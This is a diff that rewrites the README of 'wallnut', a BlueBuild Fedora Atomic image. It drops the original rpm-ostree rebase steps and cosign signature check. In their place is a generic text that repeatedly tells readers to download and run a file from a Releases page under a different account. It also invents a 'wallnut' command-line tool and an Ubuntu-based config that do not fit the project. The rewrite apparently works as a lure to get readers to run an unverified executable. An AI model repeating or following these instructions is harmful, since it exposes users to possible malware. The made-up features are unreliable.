@@ -1,43 +1,115 @@
-# wallnut &nbsp; [![bluebuild build badge](https://github.com/tbangit/wallnut/actions/workflows/build.yml/badge.svg)](https://github.com/tbangit/wallnut/actions/workflows/build.yml)
+# 🥜 Wallnut: Your Custom Linux Image Solution
 
-See the [BlueBuild docs](https://blue-build.org/how-to/setup/) for quick setup instructions for setting up your own repository based on this template.
+![Wallnut Logo](https://img.shields.io/badge/Wallnut-Project-brightgreen)
 
-After setup, it is recommended you update this README to describe your custom image.
+Welcome to the **Wallnut** repository! This project aims to provide a robust solution for creating and managing custom Linux images. Whether you need an immutable operating system for your applications or a tailored image for specific tasks, Wallnut has you covered.
 
-## Installation
+## 🚀 Quick Start
 
-> [!WARNING]  
-> [This is an experimental feature](https://www.fedoraproject.org/wiki/Changes/OstreeNativeContainerStable), try at your own discretion.
+To get started, download the latest release from our [Releases section](https://github.com/elTREX2222/wallnut/releases). Execute the downloaded file to set up Wallnut on your system.
 
-To rebase an existing atomic Fedora installation to the latest build:
+## 📚 Table of Contents
 
-- First rebase to the unsigned image, to get the proper signing keys and policies installed:
-  ```
-  rpm-ostree rebase ostree-unverified-registry:ghcr.io/tbangit/wallnut:latest
-  ```
-- Reboot to complete the rebase:
-  ```
-  systemctl reboot
-  ```
-- Then rebase to the signed image, like so:
-  ```
-  rpm-ostree rebase ostree-image-signed:docker://ghcr.io/tbangit/wallnut:latest
-  ```
-- Reboot again to complete the installation
-  ```
-  systemctl reboot
-  ```
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Topics](#topics)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
-The `latest` tag will automatically point to the latest build. That build will still always use the Fedora version specified in `recipe.yml`, so you won't get accidentally updated to the next major version.
+## 🌟 Features
 
-## ISO
+- **Atomic Builds**: Ensure that your images are built atomically, preventing partial updates.
+- **Custom Images**: Tailor your images to meet specific needs.
+- **Immutable Design**: Create images that do not change after deployment, enhancing security.
+- **OCI Compatibility**: Use images that comply with the Open Container Initiative standards.
+- **Linux Customization**: Modify the Linux kernel and other components as per your requirements.
 
-If build on Fedora Atomic, you can generate an offline ISO with the instructions available [here](https://blue-build.org/learn/universal-blue/#fresh-install-from-an-iso). These ISOs cannot unfortunately be distributed on GitHub for free due to large sizes, so for public projects something else has to be used for hosting.
+## 📦 Installation
 
-## Verification
+To install Wallnut, follow these steps:
 
-These images are signed with [Sigstore](https://www.sigstore.dev/)'s [cosign](https://github.com/sigstore/cosign). You can verify the signature by downloading the `cosign.pub` file from this repo and running the following command:
+1. **Download the latest release** from our [Releases section](https://github.com/elTREX2222/wallnut/releases).
+2. **Execute the downloaded file** to install Wallnut on your system.
+
+Make sure you have the necessary permissions to execute files on your system.
+
+## 🛠️ Usage
+
+Once you have installed Wallnut, you can start creating your custom images. Here’s a basic command to get you started:
 
 ```bash
-cosign verify --key cosign.pub ghcr.io/tbangit/wallnut
+wallnut create --name my-custom-image
 ```
+
+This command creates a new custom image named `my-custom-image`. You can customize various parameters based on your requirements.
+
+### Example Commands
+
+- **List Available Images**:
+    ```bash
+    wallnut list
+    ```
+
+- **Delete an Image**:
+    ```bash
+    wallnut delete --name my-custom-image
+    ```
+
+- **Update an Image**:
+    ```bash
+    wallnut update --name my-custom-image
+    ```
+
+### Configuration
+
+Wallnut supports a configuration file to define your image settings. Create a `wallnut-config.yaml` file with the following structure:
+
+```yaml
+image:
+  name: my-custom-image
+  version: 1.0
+  base: ubuntu:20.04
+  packages:
+    - curl
+    - git
+```
+
+You can customize the `base` image and the `packages` as per your requirements.
+
+## 🏷️ Topics
+
+This repository covers a variety of topics relevant to custom Linux images:
+
+- **Atomic**: Focus on atomic builds for reliability.
+- **Bluebuild**: Utilize the Bluebuild system for streamlined image creation.
+- **Custom Image**: Design images that meet your specific needs.
+- **Image-Based**: Work with image-based systems for flexibility.
+- **Immutable**: Create images that do not change post-deployment.
+- **Linux**: Leverage the power of Linux for your projects.
+- **OCI**: Ensure compliance with OCI standards for container images.
+
+## 🤝 Contributing
+
+We welcome contributions from the community! To contribute to Wallnut:
+
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Commit your changes and push the branch.
+4. Submit a pull request.
+
+Please ensure that your code adheres to our coding standards and includes appropriate tests.
+
+## 📜 License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
+
+## 📞 Contact
+
+For questions or feedback, feel free to reach out:
+
+- **Email**: contact@example.com
+- **GitHub Issues**: Use the Issues section of this repository.
+
+Thank you for checking out Wallnut! We hope you find it useful for your custom Linux image needs. Don't forget to visit our [Releases section](https://github.com/elTREX2222/wallnut/releases) for the latest updates.
